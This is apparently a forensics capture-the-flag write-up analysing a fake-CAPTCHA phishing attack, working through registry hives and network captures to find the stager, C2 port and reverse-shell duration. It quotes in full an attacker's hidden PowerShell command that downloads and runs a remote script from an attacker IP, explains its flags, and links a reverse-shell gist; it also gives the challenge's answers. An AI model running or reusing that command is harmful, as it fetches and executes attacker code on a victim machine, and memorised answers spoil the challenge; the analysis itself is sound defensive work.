# Pikaptcha

![image](https://github.com/user-attachments/assets/e29f4a11-7ca9-4957-881f-859e6d749c7a)


> Write-up author: jon-brandy

## Lessons Learned:
1. Using registry explorer to load user's registry hive.
2. Reviewing malicious powershell that acts as a downloader.
3. Identify the threat actor's C2 server.
4. Calculate reverse shell's session duration.
5. Identify the JS function used by the threat actor to lure the victim. (phishing captcha).
6. Is a new and sophisticated method of distributing Lumma Stealer Malware.

## SCENARIO:
<p align="justify">Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing attacks last year and was now aware of attacker tactics, immediately notified the security team to isolate the machine as he suspected an attack. You are provided with network traffic and endpoint artifacts to answer questions about what happened.</p>

## STEPS:
1. In this case, we're tasked to investigate a recent phishing attack.
2. A person named Happy Grunwald contacted Alonzo, a system administrator, regarding an issue with downloading the latest version of Microsoft Office.
3. Happy reported that he received an email instructing him to update Microsoft Office via a link. After clicking the link, he was prompted to solve a CAPTCHA, but no download page appeared afterward.
4. Recognizing this as a potential phishing attempt, Alonzo became suspicious of the attacker’s tactics. He contacted the security team, who promptly isolated the victim’s machine and provided us with network traffic data and endpoint artifacts for analysis.

![image](https://github.com/user-attachments/assets/8e6a4129-e597-4e74-8094-b4c111b3cf51)


> 1ST QUESTION --> ANS: `powershell -NOP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"`

![image](https://github.com/user-attachments/assets/a78977c0-5c0a-48a5-8b36-473255407f4a)


5. We're given many registry hives and prefetch folder, it's kinda painful to analyze windows registry hives without knowing the context and location of what is our interest.
6. To review recently executed command, we can start analyzing from `RunMRU` registry key for **happy grunwald** user.
7. To analyze the registry hives I used `registry explorer`. But actually you can use `registry viewer` or just mount it using `winregfs`. To load the registry hive for user **happy grundwald**, simply load the `NTUSER.DAT` of **happy grundwald**.

![image](https://github.com/user-attachments/assets/7858c1ff-0032-44dd-9f25-eaa84c5689e5)


> RESULT IN REGISTRY EXPLORER

![image](https://github.com/user-attachments/assets/72e2be4e-ba96-4edc-a1ca-1f5427eb33c6)



8. Again, to reduce the pain by traverse the folder manually, instead we can use the search bar to find **RunMRU**.

![image](https://github.com/user-attachments/assets/bc3c7289-8ebd-4375-99fb-885d9f3873dc)


9. Notice that we found a powershell command execution from a remote source. This is a hint for a malicious activity.

> Malicious Powershell Script

```pwsh
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"\1
```

#### NOTES REGARDING THE POWERSHELL EXECUTION FOUND:

`-NoP` flag (No Profile), is used to prevent powershell from loading the user's profile scripts (it can be used to reduce startup time). `-Noni` (Non-Interactive) flag is used to run the powershell script in a non-interactive mode. `-W hidden` flag is used to hides the powershell window, thus making the executiion invisible to the user.

The biggest red flag is `-Exec Bypass`, this flag used to override the system's execution policy, allowing the script to run regardless of any policy settings that might prevent it. This flag is actually is the biggest red flag if it is executed by non legitimate user.

`-Command` flag is used to specify the powershell command, `IEX` (Invoke Expression) this cmdlet is used to evaluate or runs the expression passed to it. `(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')` this part creates a new web client object to download the script from the remote server and this script content is passed to IEX which runs it in the current powershell session.

In short, this powershell command is used to download a malicious powersell script file --> `office2024install.ps1`. 


11. Anyway if we correlate this with cyber kill chain stages, this stage is at the **installation** stage --> stage where the attacker tried to gain persistence.
12. Great! Simple as that now we identified the full command that was run to download and execute the stager.


> 2ND QUESTION --> ANS: `2024-09-23 05:07:45`

![image](https://github.com/user-attachments/assets/ca12a9cd-dee8-4948-9431-11f2e50dd65e)

13. Again, we can identify the timestamp of the execution at the `registry explorer`. It is shown clear.

![image](https://github.com/user-attachments/assets/4f95b2d4-c53a-4bc7-a3cd-6643fde35cab)


> 3RD QUESTION --> ANS: `579284442094e1a44bea9cfb7d8d794c8977714f827c97bcb2822a97742914de`

![image](https://github.com/user-attachments/assets/672f5b38-997b-4467-a94d-1db9dc5a9676)


14. Let's shift our focus to the captured network traffic to exfitrate the powershell script, because we cannot download the powershell script from registry explorer, because **registry hive actually just stored a configuration data not actual files**.

> Wireshark

![image](https://github.com/user-attachments/assets/8976e815-ee06-417d-99f1-cb244dd43177)


15. Actually now it's much easier, because we already identified the threat actor IP and the malicious file downloaded from the remote server. We can simply export the objects from wireshark.

![image](https://github.com/user-attachments/assets/72ee81ba-eef1-4c43-a545-2037e7ea1c53)


16. To see the script contens, simply follow the related packet stream.
17. Based from the result, you can see that it contains an encoded powershell command.

![image](https://github.com/user-attachments/assets/d04f43b8-0857-4ab7-970b-2cbeb3d19cb4)

> DECODED VALUES

![image](https://github.com/user-attachments/assets/4150bf57-4c19-453b-a7e7-69ac31805a2b)

18. Interesting! Not a geek in powershell script, but `System.Net.Sockets.TCPClient` syntax is used to send and receive data.
19. So if we correlate this again to next stages in cyber kill chain, current stage is **Command and Control**, this could be the backdoor that the attacker tried to use then.
20. Searching on the internet regarding reverse shell payload for powershell, found this github gist:

![image](https://github.com/user-attachments/assets/d88123eb-c241-4bbf-96c1-ea476eb26941)

21. It is exactly the same! Anyway let's get the hash IOC.

> Hash IOC

![image](https://github.com/user-attachments/assets/cf656d59-2ab0-4dc7-bced-96f7bfc3fc23)


> 4TH QUESTION --> ANS: 6969

![image](https://github.com/user-attachments/assets/a0bf7148-2f6b-422d-bffb-22e92ccbb706)


22. The port is identified previously as we analyzed the C2 script. The port is `6969`.


> 5TH QUESTION --> ANS: 403

![image](https://github.com/user-attachments/assets/4d9b46be-84f4-4669-aa44-9be1ce7f280b)

23. Now to identify how many seconds was the reverse shell connection established between C2 and the victim's workstation, we can start by reviewing the next TCP protocol which communicated on port 6969.

![image](https://github.com/user-attachments/assets/060d3ba2-063c-4b94-97cd-5c98be7ed4c7)


23. Instead calculating it manually, I used a library named **datetime** from python.

> SCRIPT TO CALCULATE THE TIMESTAMP

```py
from pwn import *
import os
from datetime import datetime

os.system('clear')

st = datetime.strptime("05:07:48", "%H:%M:%S")
end = datetime.strptime("05:14:31", "%H:%M:%S")

diff = (end - st).total_seconds()
log.success(f'RESULT --> {diff}')
```

> RESULT

![image](https://github.com/user-attachments/assets/d636c4d9-b56e-4e2b-a5ed-c033f108a315)


> 6TH QUESTION --> ANS: StageClipboard

![image](https://github.com/user-attachments/assets/13f0b3f6-8563-4606-b356-4dd0d806f481)


24. Upon reviewing the threat actor activities, found that the attacker tried to install another powershell script.

![image](https://github.com/user-attachments/assets/4b33e136-c25b-4e23-bf2b-1aa3506cda93)


#### NOTES:

Bloodhound is an open source tool used in Active Directory (AD) environment to map relationships and permissions. This tool help threat actor in reconnaisance to identify potential attack paths for privesc and lateral movement.

![image](https://github.com/user-attachments/assets/b1e890ad-b0f9-4a71-8b1c-58ba64ebd240)


25. Now let's shift again our focus to identify the function name which contains the malicious payload to be pasted in the victim's password. Our objective should be to identify the malicious javascript function or code within the fake captcha page.
26. To narrow down our packet analysis, I filter the packets shown to the attacker IP alongside with http protocol.

![image](https://github.com/user-attachments/assets/097f1a0f-cfcc-48da-9c04-cd6e44f15a38)

27. Following the first HTTP packet data then scrolling down, we can identify the **script** tag that should be our interest section to be analyzed.
28. Upon reviewing it found a function which embedded with the powershell command we previously found during our first analysis at the victim registry hive.

![image](https://github.com/user-attachments/assets/f57f3353-3b3c-47e9-bac0-9c6ecc6bcb9b)

29. As an additional information, this case is very similar to **Lumma Stealer** malware that exploits fake CAPTCHA pages.

![image](https://github.com/user-attachments/assets/ce5d3dbb-4092-45e7-9147-a7526e39fa30)


30. Anyway, great! We've investigated the case!

# IMPORTANT LINKS:

```
https://ericzimmerman.github.io/#!index.md
https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3
https://github.com/BloodHoundAD/BloodHound
https://www.cloudsek.com/blog/unmasking-the-danger-lumma-stealer-malware-exploits-fake-captcha-pages
```
